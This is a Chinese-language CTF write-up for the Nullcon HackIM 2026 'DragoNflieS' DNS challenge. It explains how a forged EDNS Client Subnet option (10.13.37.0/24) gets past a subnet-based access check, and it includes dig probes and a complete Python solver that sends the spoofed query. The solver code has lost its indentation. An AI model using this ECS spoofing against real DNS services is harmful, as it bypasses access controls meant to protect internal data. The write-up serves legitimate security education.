---
title: "DragoNflieS - Nullcon Goa HackIM 2026 CTF"
category: "misc"
type: "writeup"
tags: ["misc", "dns", "ecs", "dragonflies", "nullcon-goa-hackim-2026-ctf", "2026", "ctf-writeup"]
summary: "\\- Local directory: misc/DragoNflieS"
source:
  name: "CTFtime writeup #40566"
  url: "https://ctftime.org/writeup/40566"
ctf:
  name: "Nullcon Goa HackIM 2026 CTF"
  year: 2026
  challenge: "DragoNflieS"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2026 CTF
- **Task:** DragoNflieS
- **Author team:** 正规子群.AI
- **CTFtime tags:** misc, dns, ecs
- **CTFtime:** <https://ctftime.org/writeup/40566>

---
## 103 DragoNflieS

\- Category: `misc`  
\- Value: `257`  
\- Solves: `82`  
\- Solved by me: `True`  
\- Local directory: `misc/DragoNflieS`

### 题目描述  
> Are you up to date about the latest and greatest DNS features? Now you don't need VPN and Firewalls anymore to ensure that only internal networks can resolve certain DNS names, such as [flag.ctf.nullcon.net](http://flag.ctf.nullcon.net).  
>  
> Try it yourself on port 5053  
>  
> Author: vonDowntown & gehaxelt

### 连接信息  
\- `52.59.124.14:5053`

### 附件下载地址  
\- 无

### 内存布局  
\- 暂无可解析二进制 或 本题主要是非二进制方向

### WP  
# DragoNflieS WP

\---

## 题目理解

目标服务是 `52.59.124.14:5053`，题面关键词是“latest DNS features”和“只让内网解析”。

这类描述通常不是传统 DNS 记录爆破，而是基于请求来源做访问控制。现代 DNS 常见可被滥用的来源相关特性是 `EDNS Client Subnet`，即 ECS（option code 8）。

直觉模型是：

1\. 服务端根据“客户端网段”判断是否回真值。  
2\. 若错误实现为“信任 ECS 声明值”，就可以伪造来源网段绕过 ACL。

\---

## 初始观测

先用 `dig` 做最小探测：

```bash  
timeout 5s dig @52.59.124.14 -p 5053 [flag.ctf.nullcon.net](http://flag.ctf.nullcon.net) TXT +time=2 +tries=1 +short  
```

返回：

```text  
ENO{Zzzzt_Zzzzt_FAKEFLAG_Zzzzt}  
```

并且非 `TXT` 查询多为 `"NOPE"`，说明服务是自定义逻辑，不是普通权威 DNS 配置。

\---

## 失败尝试与排查过程

### 传输层与常规参数

尝试了以下方向，均没有拿到真 flag：

1\. TCP DNS 与 UDP DNS切换。  
2\. `+dnssec`、EDNS 版本、不同 `bufsize`。  
3\. `RD/RA` 等标志变化。

结论：常规参数不是触发点。

### 协议头绕过思路

尝试构造 `PROXY protocol v2` 头后再拼接 DNS 请求，模拟上游代理透传来源地址。

结果：服务端对该输入直接超时丢弃，没有有效回包。

结论：不是 PROXY 协议链路。

### ECS 小范围定向测试

将测试集中到 ECS，按“少量高价值网段”验证：

1\. `127.0.0.0/8`、`10.0.0.0/8`、`172.16.0.0/12`、`192.168.0.0/16`。  
2\. `169.254.0.0/16`、`100.64.0.0/10`。  
3\. 以及若干 /32 点位。

出现关键分叉：

\- `ECS=10.13.37.0/24` 或 `10.13.37.7/32` 返回  
`ENO{Whirr_do_not_send_private_data_for_wrong_IP_Whirr}`。  
\- 其他大多数网段仍返回假 flag。

这说明服务端确实在用 ECS 决策，并对 `10.13.37.0/24` 走了不同分支。

进一步把 `10.13.37.0/24` 的 256 个 `/32` 全测，结果全部一致，确认任意 `10.13.37.x/32` 都可触发该分支。

\---

## 报文内存布局

这里的“内存布局”指网络报文在字节级的布局。关键是 DNS Header、Question 和 Additional 里的 OPT RR。

### DNS 头部布局

固定 12 字节：

| 偏移 | 字段 | 大小 |  
|---|---|---|  
| 0 | ID | 2 |  
| 2 | Flags | 2 |  
| 4 | QDCOUNT | 2 |  
| 6 | ANCOUNT | 2 |  
| 8 | NSCOUNT | 2 |  
| 10 | ARCOUNT | 2 |

我们使用 `QDCOUNT=1`，带 ECS 时 `ARCOUNT=1`。

### Question 布局

`QNAME | QTYPE | QCLASS`，其中：

\- `QNAME = [flag.ctf.nullcon.net](http://flag.ctf.nullcon.net)` 的 label 编码。  
\- `QTYPE = TXT(16)`。  
\- `QCLASS = IN(1)`。

### OPT RR 与 ECS option

Additional 里放一个 `OPT` 记录（`TYPE=41`），其 `RDATA` 是 option 列表。

ECS option 编码：

1\. `OPTION-CODE = 8`。  
2\. `OPTION-LENGTH = len(family + source_prefix + scope_prefix + address_bytes)`。  
3\. `family = 1` 表示 IPv4。  
4\. `source_prefix = 32`。  
5\. `scope_prefix = 0`。  
6\. `address_bytes = 10.13.37.7` 的 4 字节。

地址字节长度满足：

$addr_{len} = \left\lceil \frac{prefix}{8} \right\rceil = \lfloor \frac{prefix + 7}{8} \rfloor$

当 `prefix=32` 时，`addr_len=4`。

\---

## 利用脚本

脚本路径：`solution/[solution.py](http://solution.py)`

核心流程：

1\. 手工构造 DNS 查询包。  
2\. 在 Additional 中加入 ECS option，默认 `10.13.37.7/32`。  
3\. UDP 发送到 `52.59.124.14:5053`。  
4\. 解析回答里的 TXT 字符串。

运行：

```bash  
timeout 20s python3 solution/[solution.py](http://solution.py)  
```

实际验证输出：

```text  
TXT answers:  
ENO{Whirr_do_not_send_private_data_for_wrong_IP_Whirr}  
flag: ENO{Whirr_do_not_send_private_data_for_wrong_IP_Whirr}  
```

\---

## Flag

```text  
ENO{Whirr_do_not_send_private_data_for_wrong_IP_Whirr}  
```

\---

## 复盘

本题核心不是暴力枚举记录，而是识别“DNS 来源信任边界”。

服务把 ECS 当作可信来源信号，导致客户端可伪造网段进入受限分支。即使题目文案提到“不需要 VPN/防火墙”，如果实现上直接信任可控字段，依然会被绕过。

### Exploit  
#### misc/DragoNflieS/solution/[solution.py](http://solution.py)

```python  
#!/usr/bin/env python3  
import argparse  
import ipaddress  
import random  
import socket  
import struct  
from typing import List, Tuple

def encode_qname(name: str) -> bytes:  
labels = name.rstrip('.').split('.')  
return b''.join(bytes([len(x)]) + x.encode() for x in labels) + b'\x00'

def build_ecs_option(subnet: str) -> bytes:  
net = ipaddress.ip_network(subnet, strict=False)  
family = 1 if net.version == 4 else 2  
source_prefix = net.prefixlen  
scope_prefix = 0  
addr_len = (source_prefix + 7) // 8  
addr = net.network_address.packed[:addr_len]  
data = struct.pack('!HBB', family, source_prefix, scope_prefix) + addr  
return struct.pack('!HH', 8, len(data)) + data

def build_query(domain: str, qtype: int = 16, ecs_subnet: str = '') -> Tuple[int, bytes]:  
query_id = random.randrange(0, 65536)  
qname = encode_qname(domain)  
qpart = qname + struct.pack('!HH', qtype, 1)

additional = b''  
arcount = 0  
if ecs_subnet:  
opt = build_ecs_option(ecs_subnet)  
additional = b'\x00' + struct.pack('!HHiH', 41, 4096, 0, len(opt)) + opt  
arcount = 1

header = struct.pack('!HHHHHH', query_id, 0x0100, 1, 0, 0, arcount)  
return query_id, header + qpart + additional

def read_name(pkt: bytes, offset: int) -> Tuple[str, int]:  
labels: List[str] = []  
jumped = False  
end_offset = offset  
while True:  
if offset >= len(pkt):  
raise ValueError('name overflow')  
length = pkt[offset]  
if length == 0:  
if not jumped:  
end_offset = offset + 1  
break  
if length & 0xC0 == 0xC0:  
if offset + 1 >= len(pkt):  
raise ValueError('bad pointer')  
pointer = ((length & 0x3F) << 8) | pkt[offset + 1]  
if not jumped:  
end_offset = offset + 2  
offset = pointer  
jumped = True  
continue  
offset += 1  
if offset + length > len(pkt):  
raise ValueError('label overflow')  
labels.append(pkt[offset:offset + length].decode(errors='replace'))  
offset += length  
if not jumped:  
end_offset = offset  
return '.'.join(labels), end_offset

def parse_txt_answers(pkt: bytes, expected_id: int) -> List[str]:  
if len(pkt) < 12:  
raise ValueError('short response')  
rid, flags, qd, an, ns, ar = struct.unpack('!HHHHHH', pkt[:12])  
if rid != expected_id:  
raise ValueError(f'query id mismatch: {rid} != {expected_id}')

offset = 12  
for _ in range(qd):  
_, offset = read_name(pkt, offset)  
offset += 4

txt_records: List[str] = []  
for _ in range(an):  
_, offset = read_name(pkt, offset)  
if offset + 10 > len(pkt):  
raise ValueError('broken rr header')  
rtype, rclass, ttl, rdlen = struct.unpack('!HHIH', pkt[offset:offset + 10])  
offset += 10  
if offset + rdlen > len(pkt):  
raise ValueError('broken rdata')  
rdata = pkt[offset:offset + rdlen]  
offset += rdlen

if rtype == 16:  
chunks = []  
i = 0  
while i < len(rdata):  
ln = rdata[i]  
i += 1  
chunks.append(rdata[i:i + ln].decode(errors='replace'))  
i += ln  
txt_records.append(''.join(chunks))

return txt_records

def main() -> int:  
parser = argparse.ArgumentParser(description='Solve DragoNflieS via ECS-based DNS query.')  
parser.add_argument('--host', default='52.59.124.14')  
parser.add_argument('--port', type=int, default=5053)  
parser.add_argument('--domain', default='[flag.ctf.nullcon.net](http://flag.ctf.nullcon.net)')  
parser.add_argument('--ecs', default='10.13.37.7/32', help='ECS subnet, e.g. 10.13.37.7/32')  
parser.add_argument('--timeout', type=float, default=2.0)  
args = parser.parse_args()

query_id, pkt = build_query(args.domain, qtype=16, ecs_subnet=args.ecs)  
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
sock.settimeout(args.timeout)

try:  
sock.sendto(pkt, (args.host, args.port))  
resp, _ = sock.recvfrom(4096)  
finally:  
sock.close()

txts = parse_txt_answers(resp, query_id)  
if not txts:  
print('No TXT answer found')  
return 1

print('TXT answers:')  
for item in txts:  
print(item)

target = next((x for x in txts if x.startswith('ENO{') and x.endswith('}')), None)  
if target:  
print(f'flag: {target}')  
return 0

return 1

if __name__ == '__main__':  
raise SystemExit(main())  
```

\---
